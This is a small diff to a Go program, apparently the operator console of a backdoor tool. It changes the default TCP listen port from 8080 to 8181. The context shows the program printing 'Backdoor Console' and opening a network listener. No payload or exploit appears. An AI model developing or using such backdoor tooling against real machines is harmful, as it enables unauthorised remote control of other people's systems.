@@ -18,7 +18,7 @@ import (
 var EncKey string = ""
 
 func main() {
-	port := flag.Int("listen", 8080, "Port you want to listen on.")
+	port := flag.Int("listen", 8181, "Port you want to listen on.")
 	flag.Parse()
 	fmt.Println("Backdoor Console")
 	ln, _ := net.Listen("tcp", ":"+strconv.Itoa(*port))
